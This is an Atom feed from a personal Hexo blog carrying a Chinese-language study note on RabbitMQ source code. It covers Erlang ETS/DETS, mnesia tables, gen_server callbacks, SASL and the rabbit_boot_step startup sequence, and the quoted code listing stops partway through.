<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Saar&#39;s Blog</title>
  
  <subtitle>不忘初心 方得始终</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://www.yorzorzy.xyz/"/>
  <updated>2021-01-28T01:49:38.907Z</updated>
  <id>http://www.yorzorzy.xyz/</id>
  
  <author>
    <name>Saar</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>rabbitmq源码学习二</title>
    <link href="http://www.yorzorzy.xyz/2021/01/28/rabbitmq%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/"/>
    <id>http://www.yorzorzy.xyz/2021/01/28/rabbitmq%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%902/</id>
    <published>2021-01-28T01:49:38.907Z</published>
    <updated>2021-01-28T01:49:38.907Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><h2 id="rabbitmq-源码分析二"><a href="#rabbitmq-源码分析二" class="headerlink" title="rabbitmq 源码分析二"></a>rabbitmq 源码分析二</h2><h3 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h3><p>OTP代表Open Telecom Platform，开放电信平台。</p><h3 id="erlang的存储"><a href="#erlang的存储" class="headerlink" title="erlang的存储"></a>erlang的存储</h3><p>ets和dets是两个erlang中的系统模块，用于存储海量的erlang数据。ETS是Erlang Term Storage的缩写，DETS则是Disk ETS的缩写。</p><p>ETS和DETS提供健和值的查询表。ETS常驻内存，DETS则常驻磁盘。</p><p>ETS表内部使用散列表标识，也就是平衡二叉树。</p><p>ETS不会进行垃圾收集，也就是表中存储了海量的数据也不会产生垃圾收集的开销。</p><p>DETS的最大的文件大小是2G。</p><h3 id="rabbitmq中的mnesia"><a href="#rabbitmq中的mnesia" class="headerlink" title="rabbitmq中的mnesia"></a>rabbitmq中的mnesia</h3><p>mnesia是用erlang编写的数据库，用于高要求的电信应用程序，支持事务。</p><p>mnesia是基于Erlang的分布式数据库管理系统，是Erlang OTP的重要组件。</p><p>mnesia数据库被组织为一个表的集合，每个表由记录(通常被定义为Erlang Record)构成，表本身也包含一些属性，如类型，位置和持久性。这种表集合和记录的概念，和ets表很类似。事实上，mnesia中的数据在节点内就是以ets表存储的。因此，mnesia实际上是一个分布式的ets。</p><p>mnesia中的表在节点内有三种存储形式：</p><ul><li><code>ram_copies</code>: 表仅存储于内存，可通过<code>mnesia:dump_tables(TabList)</code>来将数据导入到硬盘。</li><li><code>disc_copies</code>: 表存储于内存中，但同时拥有磁盘备份，对表的写操作会分为两步：1.将写操作写入日志文件 2. 对内存中的表执行写操作</li><li><code>disc_only_copies</code>: 表仅存储于磁盘中，对表的读写将会更慢，但是不会占用内存</li></ul><p>表的存储形式可以在表的创建中指出，默认为ram_copies。也可以在创建表后通过<code>mnesia:change_table_copy_type/3</code>来修改。</p><p>表的属性由<code>mnesia:create_table(Name, TableDef)</code>中的TableDef指定，TableDef是一个Tuple List，其中比较重要的属性有：</p><ul><li><code>type</code>: 表的类型，主要有set, ordered_set和bag三种。前两者要求key唯一，bag不要求key唯一，但要求至少有一个字段不同。另外set和bag通过哈希表实现，而ordered_set则使用其它数据结构(如红黑树)以对key排序。type属性默认为set。</li><li><code>attributes</code>: 表中条目的字段，通常由record_info(fields, myrecord)得出，而myrecord一般则用作表名。</li><li><code>local_content</code>: 标识该表是否为本地表，local_content属性为true的表将仅本地可见，不会共享到集群中。local_content默认为false。</li><li><code>index</code>: 表的索引。</li><li><code>ram_copies</code>: 指名该表在哪些节点上存储为ram_copies。默认值为[node()]。即新建表默认都存储为ram_copies。</li><li><code>disc_copies</code>: 该表在哪些节点上存储为disc_copies。默认为[]。</li><li><code>disc_only_copies</code>: 该表在哪些节点上存储为disc_only_copies。默认为[]。</li></ul><p>schema表是mnesia数据库一张特殊的表，又叫模式表。它记录数据库中其它表的信息，schema表只能有ram_copies或disc_copies两种存储形式。并且一旦schema表存储为ram_copies，那么该节点上的其它表，也将只能存储为ram_copies。</p><p>mnesia需要schema表的初始化自身，可在mnesia启动前，通过<code>mnesia:create_schema/1</code>来创建一个disc_copies类型的schema表，如果不调用<code>mnesia:create_schema/1</code>，直接启动<code>mnesia:start/0</code>，默认生成一个ram_copies类型的schema表，此时我们称该mnesia节点为”无盘节点”，因为其所有表都不能存储于磁盘中。</p><p>mnesia表由记录组成，记录第一个元素为是记录名，第二个元素为标识记录的键。{表名，键}可以唯一标识表中特定记录，又称为记录的对象标识(Oid)。</p><p>mnesia要求表中所有的记录必须为同一个record的实例，前面的例子中，表名即为记录名，表字段则为记录的域。而实际上，记录名可以是但不一定是表名，记录名可通过record_name属性指出，没有指定table_name则记录名默认为create_table第一参数指定的表名。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mnesia:dirty_write(Record) -&gt;</span><br><span class="line">    Tab &#x3D; element(1, Record), </span><br><span class="line">    mnesia:dirty_write(Tab, Record). % 这里提取出表名，表名和表中记录原型实际上是分离的</span><br></pre></td></tr></table></figure><p>表名和记录名不一致使我们可以定义多个以同一record的原型的table。</p><p>mneisa的优势:</p><ul><li>与Erlang的完美契合，记录字段可以是任意Erlang Term，具备强大的描述能力</li><li>和传统数据库一样，支持事务，索引，分片等特性</li><li>分布式特性，表的存储类型和位置对应用透明，支持分布式事务</li><li>强大的动态配置能力，包括集群的动态伸缩，表的动态配置，增删，转移，升级等</li></ul><p>mnesia缺点：</p><ul><li>多节点事务带来的开销，尽可能少使用事务(在逻辑上配合做处理)</li><li>mnesia全联通网络的维护开销，在使用时需要控制集群节点数量</li><li>不适合存储大量数据，这会带来网络负载</li></ul><h3 id="gen-server"><a href="#gen-server" class="headerlink" title="gen_server"></a>gen_server</h3><p>gen_server代表的就是“行为模式”的一种，行为模式的目的在于为特定类型的进程提供一套模板。</p><p>用来启动服务器的有<code>start/3</code>,<code>start/4</code>,<code>start_link/3</code>,<code>start_link/4</code>这四个函数。 使用这些start函数之后，就会产生一个新的进程，也就是一个gen_server服务器。这些 start函数的正常情况下返回值是<code>{ok,Pid}</code>，<code>Pid</code>就是这个新进程的进程号。 带link与不带的区别在于是否跟父进程建立链接，换种说法是，新启动的进程死掉后，会不会通知启动他的进程（父进程）。</p><p>start函数可以四个参数<code>(ServerName, Module, Args, Options)</code>：</p><ul><li>第一个参数<code>ServerName</code>是服务名， 是可以省掉的。具有相同服务名的模块在一个节点中只能启动一次，重复启动会报错，为 <code>{error, {already_started, Pid}}</code>。具有服务名的服务进程可以使用服务名来调用， 没有服务名的只能通过进程号pid来调用了。通常有名字的服务进程会使用模块名做为 服务名，即上面模板中定义的宏<code>-define(SERVER, ?MODULE)</code>，然后在需要使用服务名的 地方填入<code>?SERVER</code>.</li><li>第二个参数<code>Module</code>是模块名，一般而言API和回调函数是写在同一个文件里的，所以就用 <code>?MODULE</code>，表示本模块的模块名。</li><li>第三个参数<code>Args</code>是回调函数<code>init/1</code>的参数，会原封不动地传给<code>init/1</code>。</li><li>第四个参数<code>Options</code>是一些选项，可以设置debug、超时等东西。</li></ul><p>start对应的回调函数是<code>init/1</code>，一般来说是进行服务器启动后的一些初始化的工作， 并生成初始的状态State，正常返回是{ok, State}。这个State是贯穿整个服务器， 并把所有六个回调函数联系起来的纽带。它的值最初由<code>init/1</code>生成， 此后可以由三个handle函数修改，每次修改后又要放回返回值中， 供下一个被调用的handle函数使用。 如果<code>init/1</code>返回<code>ignore</code>或<code>{stop, Reason}</code>，则会中止服务器的启动。</p><p>有一点细节要注意的是，API函数和回调函数虽然习惯上是写在同一个文件中，但执行函数 的进程却通常是不一样的。在上面的模板中，<code>start_link/0</code>中使用<code>self()</code>的话，显示的是调用者的进程号，而在<code>init/1</code>中使用<code>self()</code>的话，显示的是服务器的进程号。</p><p><strong>使用服务器</strong></p><p>三个handle开头的回调函数对应着三种不同的使用服务器的方式。如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gen_server:call     -------------   handle_call&#x2F;3</span><br><span class="line">gen_server:cast     -------------   handle_cast&#x2F;2</span><br><span class="line">用！向服务进程发消息   -------------   handle_info&#x2F;2</span><br></pre></td></tr></table></figure><p>call是有返回值的调用；cast是无返回值的调用，即通知；而直接向服务器进程发的 消息则由handle_info处理。</p><p>call是有返回值的调用，也是所谓的同步调用，进程会在调用后一直等待直到回调函数返回为止。 它的函数形式是 <code>gen_server:call(ServerRef, Request, Timeout) -&gt; Reply</code>，</p><ul><li>第一个参数<code>ServerRef</code>是被调用的服务器，可以是服务器名，或是服务器的pid。</li><li>第二个参数<code>Request</code>会直接传给回调函数<code>handle_call。</code></li><li>最后一个参数<code>Timeout</code>是超时，是可以省略的，默认值是5秒。</li></ul><p>call是用来指挥回调函数<code>handle_call/3</code>干活的。具体形式为 <code>handle_call(Request, From, State)</code>。</p><ul><li>第一个参数<code>Request</code>是由call传进来的，是写程序时关注和处理的重点。</li><li>第二个参数<code>From</code>是gen_server传进来的，是调用的来源，也就是哪个进程执行了call。 <code>From</code>的形式是<code>{Pid, Ref}</code>，<code>Pid</code>是来源进程号，而<code>Ref</code>是调用的标识，每一次调用 都不一样，用以区别。有了Pid，在需要向来源进程发送消息时就可以使用，但由于call 是有返回值的，一般使用返回值传递数据就好。</li><li>第三个参数<code>State</code>是服务器的状态，这是由init或是其他的handle函数生成的，可以根据需要进 行修改之后，再放回返回值中。</li></ul><p><strong>call</strong></p><p>call对应的回调函数<code>handle_call/3</code>在正常情况下的返回值是<code>{reply, Reply, NewState}</code>， <code>Reply</code>会作为call的返回值传递回去，<code>NewState</code>则会作为服务器的状态。 另外还可以使用<code>{stop, Reason, State}</code>中止服务器运行，这比较少用。</p><p>使用call要小心的是，<strong>两个服务器进程不能互相call</strong>，不然会死锁。</p><h3 id="cast"><a href="#cast" class="headerlink" title="cast"></a>cast</h3><p>cast是没有返回值的调用，一般把它叫做通知。它是一个“异步”的调用，调用后会直接收到 <code>ok</code>，无需等待回调函数执行完毕。</p><p>它的形式是<code>gen_server:cast(ServerRef, Request)</code>。参数含义 与call相同。由于不需要等待返回，所以没必要设置超时，没有第三个参数。</p><p>在多节点的情况下，可以用<code>abcast</code>，向各节点上的具有指定名字的服务进程发通知。 </p><p>cast们对应的回调函数是<code>handle_cast/2</code>，具体为：<code>handle_cast(Msg, State)</code>。 第一个参数是由cast传进去的，第二个是服务器状态，和call类似，不多说。</p><p><code>handel_cast/2</code>的返回值通常是<code>{noreply, NewState}</code>，这可以用来改变服务器状态， 或是<code>{stop, Reason, NewState}</code>，这会停止服务器。通常来说，停止服务器的命令用 cast来实现比较多。</p><p>停止服务器</p><p>上面介绍的handle函数返回{stop,…}，就会使用回调函数<code>terminate/2</code>进行扫尾工作。 典型的如关闭已打开的资源、文件、网络连接，打log做记录，通知别的进程“我要死啦”， 或是“信春哥，满血复活”：利用传进来的状态State重新启动服务器。</p><h3 id="原生消息"><a href="#原生消息" class="headerlink" title="原生消息"></a>原生消息</h3><p>原生消息使用<code>handle_info/2</code>处理，具体为<code>handle_info(Info, State)</code>。其中Info是 发过来的消息的内容。回复和<code>handle_cast</code>是一样的。</p><h3 id="sasl"><a href="#sasl" class="headerlink" title="sasl"></a>sasl</h3><p>sasl 是系统架构支持库(System Architecture Support Libraries，简称SASL)，负责记录错误记录和过载保护。</p><p>erlang应用都会启动一个sasl应用，sasl的一个重要功能便是可以记录系统进程相关日志，如进程启动、结束、崩溃错误等信息。sasl的日志功能是基于erlang自带的日志模块error_logger来实现的，sasl中定义了下面3个错误处理：</p><p>sasl_report_tty_h:将日志输出到控制台</p><p>sasl_report_file_h:将日志输出到单个文件</p><p>error_logger_mf_h:循环日志文件记录</p><h3 id="cowboy"><a href="#cowboy" class="headerlink" title="cowboy"></a>cowboy</h3><p>cowboy 是一个小型的快速模块的HTTP服务器。它使用Erlang编写的。<a href="https://github.com/ninenines/cowboy" target="_blank" rel="noopener">https://github.com/ninenines/cowboy</a></p><h3 id="rabbit主流程"><a href="#rabbit主流程" class="headerlink" title="rabbit主流程"></a>rabbit主流程</h3><p>rabbit application 模块启动过程：</p><p><img src="/images/image-20201119163102592.png" alt="image-20201119163102592"></p><p>有点多。。。todo…</p><p>rabbit按照有向无环图方式一步步启动:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">%% 按照有向图的拓扑排序启动进程</span></span><br><span class="line"><span class="comment">%% pre_boot</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;pre_boot, [&#123;description, <span class="string">"rabbit boot start"</span>&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% codec_correctness_check</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;codec_correctness_check,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"codec correctness check"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_binary_generator,</span></span><br><span class="line"><span class="params">                                   check_empty_frame_size,</span></span><br><span class="line"><span class="params">                                   []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    pre_boot&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     external_infrastructure&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% rabbit_alarm currently starts memory and disk space monitors</span></span><br><span class="line"><span class="comment">%% rabbit_alarm</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;rabbit_alarm,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"alarm handler"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_alarm, start, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    pre_boot&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     external_infrastructure&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% database</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;database,</span></span><br><span class="line"><span class="params">                   [&#123;mfa,         &#123;rabbit_mnesia, init, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    file_handle_cache&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     external_infrastructure&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% database_sync</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;database_sync,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"database sync"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_child, [mnesia_sync]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    database&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     external_infrastructure&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% file_handle_cache</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;file_handle_cache,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"file handle cache server"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit, start_fhc, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    <span class="comment">%% FHC needs memory monitor to be running</span></span></span><br><span class="line"><span class="params">                    &#123;requires,    rabbit_alarm&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     worker_pool&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% worker_pool</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;worker_pool,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"worker pool"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_supervisor_child,</span></span><br><span class="line"><span class="params">                                   [worker_pool_sup]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    pre_boot&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     external_infrastructure&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% external_infrastructure</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;external_infrastructure,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"external infrastructure ready"</span>&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% rabbit_registry</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;rabbit_registry,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"plugin registry"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_registry]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    external_infrastructure&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     kernel_ready&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% rabbit_event</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;rabbit_event,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"statistics event manager"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_restartable_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_event]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    external_infrastructure&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     kernel_ready&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% kernel_ready</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;kernel_ready,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"kernel ready"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    external_infrastructure&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% rabbit_memory_monitor</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;rabbit_memory_monitor,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"memory monitor"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_restartable_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_memory_monitor]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    rabbit_alarm&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     core_initialized&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% guid_generator</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;guid_generator,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"guid generator"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_restartable_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_guid]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    kernel_ready&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     core_initialized&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% delegate_sup</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;delegate_sup,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"cluster delegate"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit, boot_delegate, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    kernel_ready&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     core_initialized&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% rabbit_node_monitor</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;rabbit_node_monitor,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"node monitor"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_restartable_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_node_monitor]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    [rabbit_alarm, guid_generator]&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     core_initialized&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% rabbit_epmd_monitor</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;rabbit_epmd_monitor,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"epmd monitor"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_restartable_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_epmd_monitor]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    kernel_ready&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     core_initialized&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% core_initialized</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;core_initialized,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"core initialized"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    kernel_ready&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% empty_db_check</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;empty_db_check,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"empty DB check"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;?MODULE, maybe_insert_default_data, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    core_initialized&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     routing_ready&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% recovery</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;recovery,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"exchange, queue and binding recovery"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit, recover, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    core_initialized&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     routing_ready&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% mirrored_queues</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;mirrored_queues,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"adding mirrors to queues"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_mirror_queue_misc, on_node_up, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    recovery&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     routing_ready&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% routing_ready</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;routing_ready,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"message delivery logic ready"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    core_initialized&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% log_relay</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;log_relay,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"error log relay"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_sup, start_child,</span></span><br><span class="line"><span class="params">                                   [rabbit_error_logger_lifecycle,</span></span><br><span class="line"><span class="params">                                    supervised_lifecycle,</span></span><br><span class="line"><span class="params">                                    [rabbit_error_logger_lifecycle,</span></span><br><span class="line"><span class="params">                                     &#123;rabbit_error_logger, start, []&#125;,</span></span><br><span class="line"><span class="params">                                     &#123;rabbit_error_logger, stop,  []&#125;]]&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    routing_ready&#125;,</span></span><br><span class="line"><span class="params">                    &#123;enables,     networking&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% direct_client</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;direct_client,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"direct client"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_direct, boot, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    log_relay&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% networking</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;networking,</span></span><br><span class="line"><span class="params">                   [&#123;mfa,         &#123;rabbit_networking, boot, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    log_relay&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% notify_cluster</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;notify_cluster,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"notify cluster nodes"</span>&#125;,</span></span><br><span class="line"><span class="params">                    &#123;mfa,         &#123;rabbit_node_monitor, notify_node_up, []&#125;&#125;,</span></span><br><span class="line"><span class="params">                    &#123;requires,    networking&#125;]&#125;)</span>.</span><br><span class="line"></span><br><span class="line"><span class="comment">%% background_gc</span></span><br><span class="line">-rabbit_boot_step<span class="params">(&#123;background_gc,</span></span><br><span class="line"><span class="params">                   [&#123;description, <span class="string">"background garbage 